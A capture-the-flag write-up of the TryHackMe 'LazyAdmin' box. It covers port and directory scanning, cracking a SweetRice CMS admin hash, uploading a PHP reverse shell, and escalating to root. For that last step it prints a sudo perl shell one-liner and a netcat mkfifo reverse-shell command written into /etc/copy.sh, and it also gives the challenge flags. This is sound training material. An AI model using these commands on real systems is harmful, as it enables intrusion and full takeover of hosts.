---
date: 2024-10-21
title: LazyAdmin THM Write-Up
machine_ip: varies
os: Linux
difficulty: Easy
my_rating: 2
tags:
  - Linux
  - PrivEsc
  - Apache
  - rustscan
  - feroxbuster
  - whatweb
  - FileUpload
  - perl
  - sudo
  - MySQL
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~/Transfer]
└─# rustscan -a 10.10.109.113 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.109.113:22
Open 10.10.109.113:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.109.113
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 17:12 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:12
Completed NSE at 17:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:12
Completed NSE at 17:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:12
Completed NSE at 17:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:12
Completed Parallel DNS resolution of 1 host. at 17:12, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:12
Scanning 10.10.109.113 [2 ports]
Discovered open port 22/tcp on 10.10.109.113
Discovered open port 80/tcp on 10.10.109.113
Completed SYN Stealth Scan at 17:12, 0.18s elapsed (2 total ports)
Initiating Service scan at 17:12
Scanning 2 services on 10.10.109.113
Completed Service scan at 17:13, 6.41s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.109.113
Retrying OS detection (try #2) against 10.10.109.113
Initiating Traceroute at 17:13
Completed Traceroute at 17:13, 3.01s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 17:13
Completed Parallel DNS resolution of 2 hosts. at 17:13, 0.03s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.109.113.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 4.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 0.63s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 0.00s elapsed
Nmap scan report for 10.10.109.113
Host is up, received user-set (0.15s latency).
Scanned at 2024-10-20 17:12:56 PDT for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/20%OT=22%CT=%CU=34827%PV=Y%DS=4%DC=T%G=N%TM=67159C9B%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.805 days (since Thu Oct 17 21:54:36 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   20.31 ms  10.2.0.1
2   ... 3
4   153.98 ms 10.10.109.113

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:13
Completed NSE at 17:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds
           Raw packets sent: 61 (4.304KB) | Rcvd: 40 (3.064KB)
```
- #SSH and #Apache on machine

- Web enumeration
	- feroxbuster - directories/files. Multiple lines all showing `/contents/...`
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.109.113    
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.109.113
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://10.10.109.113/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.10.109.113/
200      GET       36l      151w     2199c http://10.10.109.113/content/
200      GET      109l      187w     3016c http://10.10.109.113/content/images/sitemap.xsl
200      GET        3l        8w      498c http://10.10.109.113/content/images/captcha.png
200      GET        5l       26w     1401c http://10.10.109.113/content/images/xmlrss.png
200      GET       12l       42w     1313c http://10.10.109.113/content/images/ajax-loader.gif
200      GET       22l      118w     8083c http://10.10.109.113/content/images/action_icon.png
200      GET        1l        6w     3133c http://10.10.109.113/content/images/favicon.ico
200      GET       50l      205w    18864c http://10.10.109.113/content/images/logo.png
200      GET       55l      101w     1054c inc
http://10.10.109.113/content/js/function.js
200      GET       35l       81w      910c http://10.10.109.113/content/js/pins.js
200      GET       12l       25w      225c http://10.10.109.113/content/js/init.js
200      GET        1l        1w        5c http://10.10.109.113/content/inc/lastest.txt
200      GET        0l        0w        0c http://10.10.109.113/content/inc/function.php
200      GET        0l        0w        0c http://10.10.109.113/content/inc/do_attachment.php
200      GET        0l        0w        0c http://10.10.109.113/content/inc/do_sitemap.php
```
- Navigating to `http://10.10.109.113/content/` shows us a website in building
	- footer shows "Powered by [Basic-CMS.ORG](http://www.basic-cms.org/) SweetRice"
	- body shows "This site is building now , please come late. If you are the webmaster, please go to Dashboard -> General -> Website setting and uncheck the checkbox "Site close" to open your website."

- whatweb
```
└─# whatweb http://10.10.109.113     
http://10.10.109.113 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.109.113], Title[Apache2 Ubuntu Default Page: It works] 
```
- `/content/inc/latest.txt` shows us it is version 1.5.1
- navigating the directories we found a login page at: `http://10.10.109.113/content/as/`
	- looking for default creds
	- In the directory `/content/inc/`, we find a sql backup file called `/mysql_backup`
	- Within, we find the hash `42f749ade7f9e195bf475f37a44cafcb` which when cracked is `Password123`
	- Using the creds of `manager:Password123`, we can log into the admin portal

---
# Foothold

- gain shell via exploit
- Quick search for exploits lead me to a #FileUpload attack that gives #RCE 
	- [exploit](https://www.exploit-db.com/exploits/40698) for 1.5.1 SweetRice
- "Ads" tab can add php code/scripts
	- Wen to the Theme option here and uploaded a remote file. `revsh.php` using the shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- Remembering the file manager, there was an `ads` folder. Navigating to `http://10.10.80.46/content/inc/ads/` we see the `revsh.php`
	- with `nc` listening on port 443, we click on the `revsh.php` in the browser and catch a shell on LHOST
```
┌──(root㉿kali)-[~/Transfer]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.80.46] 56852
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 06:13:28 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- User flag - itguy
```
www-data@THM-Chal:/home/itguy$ cat user.txt
cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

## Pivot to a user

- We find mysql login creds
```
www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
cat mysql_login.txt
rice:randompass
```
- `netstat -ano` shows a #MySQL server running on the localhost
```
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
```
- We log into the server
```
www-data@THM-Chal:/home$ mysql -u rice -prandompass -h 127.0.0.1
mysql -u rice -prandompass -h 127.0.0.1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 91
Server version: 5.7.28-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
- This was a rabbit hole but at least I got experience with SQL

---
# PrivEsc

- escalate to root
- checking our `sudo` privileges, we can run `perl` as sudo...
```
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```
- we also find a perl script in `/home/itguy/backup.pl`
```
www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
- Knowing we can run perl as root, lets edit this `copy.sh` script that it calls,
	- used code from [swisky](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-traditional). The Netcat BusyBox line
```
www-data@THM-Chal:/etc$ echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh
<p/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f" > copy.sh       

www-data@THM-Chal:/etc$ cat copy.sh
cat copy.sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.119 1337 >/tmp/f

```

- Execute #perl script with #sudo
	- Be sure to use full file paths found in `sudo -l`
```
www-data@THM-Chal:/etc$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl
```

- Catch reverse shell as root by running #perl script as #sudo 
```
┌──(root㉿kali)-[~/Transfer]
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.80.46] 46854
# whoami
root
```

- Root flag
```
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```